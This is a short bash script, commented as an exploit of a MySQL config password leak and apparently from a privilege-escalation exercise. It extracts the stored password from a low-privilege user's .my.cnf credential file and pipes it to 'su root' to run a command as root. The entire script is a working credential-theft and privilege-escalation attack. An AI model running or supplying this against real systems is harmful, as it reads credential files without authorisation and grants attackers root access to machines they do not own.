#!/usr/bin/env bash
set -e

# Exploit MySQL config password leak: extract and su to root
data=$(grep -Po '(?<=password=).*' /home/lowpriv/.my.cnf)
echo "$data" | su root -c whoami
